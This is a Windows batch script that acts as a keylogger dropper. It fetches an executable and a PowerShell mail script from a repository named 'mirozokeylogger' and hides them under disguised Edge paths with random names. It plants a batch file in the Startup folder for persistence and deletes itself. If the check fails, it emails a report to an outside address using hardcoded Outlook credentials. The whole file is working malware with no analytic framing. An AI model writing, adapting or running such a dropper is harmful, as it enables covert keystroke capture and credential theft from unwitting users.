@echo off
if exist "C:\Windows\System32\VCRUNTIME140.DLL" (
    powershell -command "Invoke-WebRequest -URI 'https://raw.githubusercontent.com/MirozoPL/mirozokeylogger/main/kk.exe' -OutFile '%LOCALAPPDATA%\MicrosoftEdge\404eb8b50ea0d5d6\ygoLa8SyqmQTGsoh.exe'"
    powershell -command "Invoke-WebRequest -URI 'https://raw.githubusercontent.com/MirozoPL/mirozokeylogger/main/psmail.ps1' -OutFile '%LOCALAPPDATA%\MicrosoftEdge\404eb8b50ea0d5d6\LhFDtKhHgdiXDSt3.ps1'"
    powershell -command "Invoke-WebRequest -URI 'https://raw.githubusercontent.com/MirozoPL/mirozokeylogger/main/hi.bat' -OutFile '%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\hi.bat'"
    start "" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\hi.bat"
    del "%~f0"
) else (
    set "Username=jankowalski69zs@outlook.com"
    set "Password=JanKowalski1"
    powershell -command "Send-MailMessage -SmtpServer 'smtp-mail.outlook.com' -UseSsl -Port 587 -Credential (New-Object System.Management.Automation.PSCredential -ArgumentList '%Username%','%Password%') -From '%Username%' -To 'resultsiliketowatch@op.pl' -Subject 'No file detected.' -Body 'Failed attempt 0x001'"
    set "Username="
    set "Password="
    del "%~f0"
)
